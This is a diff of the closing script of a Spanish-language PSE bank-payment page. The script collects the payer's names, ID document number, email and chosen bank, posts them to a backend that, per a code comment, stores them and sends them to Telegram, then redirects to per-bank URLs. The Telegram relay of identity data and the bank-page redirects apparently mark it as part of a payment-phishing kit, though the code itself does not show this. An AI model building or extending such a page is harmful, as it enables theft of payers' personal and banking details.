+            const bancoPSE = document.getElementById('bancoPSE').value;
+            if (!bancoPSE) {
+                alert('Por favor selecciona un banco');
+                return;
+            }
+
+            // Mostrar modal de carga
+            const loadingModal = document.getElementById('loadingModal');
+            loadingModal.classList.add('show');
+
+            // Capturar datos del formulario usando IDs
+            const tipoPerson = document.getElementById('tipoPerson').value;
+            const nombres = document.getElementById('nombres').value;
+            const tipoDoc = document.getElementById('tipoDoc').value;
+            const numeroDoc = document.getElementById('numeroDoc').value;
+            const email = document.getElementById('email').value;
+
+            if (!nombres || !numeroDoc || !email) {
+                alert('Por favor completa todos los campos requeridos');
+                return;
+            }
+
+            // Preparar datos PSE
+            const dataPSE = {
+                txid_original: txid,
+                referencia: phoneNumber,
+                valor_pago: valorPago,
+                valor_formateado: valorFormateado,
+                banco: bancoPSE,
+                tipo_persona: tipoPerson,
+                nombres: nombres,
+                tipo_doc: tipoDoc,
+                numero_doc: numeroDoc,
+                email: email,
+                estado: 'iniciado'
+            };
+
+            // Guardar transacción PSE en R2 y enviar Telegram
+            try {
+                const response = await fetch('http://localhost:9090/api/guardar-pse-transaccion', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dataPSE)
+                });
+
+                const result = await response.json();
+
+                if (result.ok) {
+                    // Construir parámetros URL
+                    const queryParams = new URLSearchParams({
+                        txid: txid || '',
+                        txid_pse: result.txid_pse,
+                        referencia: phoneNumber,
+                        valor_formateado: valorFormateado,
+                        valor_pago: valorPago,
+                        estado: estado,
+                        banco: bancoPSE
+                    });
+
+                    const bankUrl = pseUrls[bancoPSE];
+
+                    if (bankUrl) {
+                        // Redirigir a URL del banco si existe
+                        window.location.href = bankUrl + '?' + queryParams.toString();
+                    } else {
+                        // Si no hay URL de banco, redirigir a Llave Bre-B
+                        queryParams.set('txid_pse', result.txid_pse);
+                        window.location.href = 'pago-llave?' + queryParams.toString();
+                    }
+                } else {
+                    loadingModal.classList.remove('show');
+                    alert('Error al procesar transacción: ' + result.error);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                loadingModal.classList.remove('show');
+                alert('Error al procesar transacción');
+            }
+        });
+
+        // Modal de cancelación
+        function abrirModalCancelar() {
+            document.getElementById('cancelModal').classList.add('active');
+        }
+
+        function cerrarModalCancelar() {
+            document.getElementById('cancelModal').classList.remove('active');
+        }
+
+        function regresarAlInicio() {
+            // Regresar a pago-inicio manteniendo el txid
+            if (txid) {
+                window.location.href = '/pago-inicio?txid=' + txid;
+            } else {
+                window.location.href = '/pago-inicio';
+            }
+        }
+
+        function confirmarCancelar() {
+            // Regresar pasando el txid si existe
+            if (txid) {
+                window.location.href = '/pago-inicio?txid=' + txid;
+            } else {
+                window.location.href = '/pago-inicio';
+            }
+        }
+
+        // Modal de Términos y Condiciones
+        function abrirModalTerminos(e) {
+            e.preventDefault();
+            document.getElementById('terminosModal').classList.add('active');
+        }
+
+        function cerrarModalTerminos() {
+            document.getElementById('terminosModal').classList.remove('active');
+        }
+
+        function cerrarModalTerminosClick(e) {
+            if (e.target.id === 'terminosModal') {
+                cerrarModalTerminos();
+            }
+        }
+    </script>
+</body>
+</html>
